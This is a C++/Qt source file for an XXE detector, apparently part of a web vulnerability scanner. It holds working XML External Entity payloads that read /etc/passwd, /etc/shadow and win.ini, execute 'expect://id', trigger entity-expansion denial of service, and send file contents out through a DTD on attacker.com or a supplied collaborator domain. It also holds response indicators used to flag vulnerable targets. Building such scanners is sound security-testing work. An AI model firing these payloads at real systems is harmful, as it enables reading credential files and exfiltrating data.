#include "xxedetector.h"
#include <QRegularExpression>

namespace {

const QStringList xxePayloads = {
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server/\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>&send;</data>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>"),
    QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>")
};

const QStringList linuxFileIndicators = {
    QStringLiteral("root:x:0:0:"),
    QStringLiteral("daemon:x:1:1:"),
    QStringLiteral("bin:x:2:2:"),
    QStringLiteral("nobody:x:"),
    QStringLiteral("/bin/bash"),
    QStringLiteral("/bin/sh"),
    QStringLiteral("/usr/sbin/nologin"),
    QStringLiteral("127.0.0.1"),
    QStringLiteral("localhost")
};

const QStringList windowsFileIndicators = {
    QStringLiteral("[fonts]"),
    QStringLiteral("[extensions]"),
    QStringLiteral("[mci extensions]"),
    QStringLiteral("[files]"),
    QStringLiteral("[Mail]"),
    QStringLiteral("MAPI=1"),
    QStringLiteral("; for 16-bit app support")
};

const QStringList xmlErrorIndicators = {
    QStringLiteral("XML Parsing Error"),
    QStringLiteral("XML parse error"),
    QStringLiteral("SAXParseException"),
    QStringLiteral("simplexml_load_string"),
    QStringLiteral("DOMDocument::load"),
    QStringLiteral("XMLReader::read"),
    QStringLiteral("JAXP"),
    QStringLiteral("TransformerException"),
    QStringLiteral("XPathException"),
    QStringLiteral("XmlException"),
    QStringLiteral("xmlParseEntityRef"),
    QStringLiteral("Entity 'xxe' not defined"),
    QStringLiteral("lxml.etree"),
    QStringLiteral("XML declaration allowed only at the start"),
    QStringLiteral("DOCTYPE is disallowed"),
    QStringLiteral("external entity"),
    QStringLiteral("ENTITY_EXPANSION_LIMIT")
};

bool containsLinuxFileContent(const QString &text) {
    for (const QString &indicator : linuxFileIndicators) {
        if (text.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool containsWindowsFileContent(const QString &text) {
    for (const QString &indicator : windowsFileIndicators) {
        if (text.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool containsXmlError(const QString &text) {
    for (const QString &indicator : xmlErrorIndicators) {
        if (text.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

} // anonymous namespace


XxeDetector::XxeType XxeDetector::detect(const QString &responseBody, const QString &expectedContent) const
{
    if (responseBody.isEmpty()) {
        return XxeType::None;
    }

    if (!expectedContent.isEmpty() && responseBody.contains(expectedContent)) {
        return XxeType::ClassicXxe;
    }

    if (containsLinuxFileContent(responseBody) || containsWindowsFileContent(responseBody)) {
        return XxeType::ClassicXxe;
    }

    if (containsXmlError(responseBody)) {
        return XxeType::ErrorBasedXxe;
    }

    return XxeType::None;
}

bool XxeDetector::isVulnerable(const QString &responseBody) const
{
    return detect(responseBody, QString()) != XxeType::None;
}

QStringList XxeDetector::getPayloads()
{
    return xxePayloads;
}

QStringList XxeDetector::getOobPayloads(const QString &collaboratorDomain)
{
    QStringList oobPayloads;

    oobPayloads << QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://%1/xxe\">%xxe;]>").arg(collaboratorDomain);
    oobPayloads << QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://%1/xxe\">]><foo>&xxe;</foo>").arg(collaboratorDomain);
    oobPayloads << QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://%1/evil.dtd\">%dtd;]><data>&send;</data>").arg(collaboratorDomain);
    oobPayloads << QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://%1/xxe\">%xxe;]>").arg(collaboratorDomain);
    oobPayloads << QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://%1/xxe.dtd\"><foo/>").arg(collaboratorDomain);

    return oobPayloads;
}

int XxeDetector::severityLevel(XxeType type)
{
    switch (type) {
    case XxeType::ClassicXxe:
    case XxeType::OobXxe:
        return 4; // Critical
    case XxeType::BlindXxe:
    case XxeType::ParameterEntityXxe:
        return 3; // High
    case XxeType::ErrorBasedXxe:
        return 2; // Medium
    default:
        return 0;
    }
}
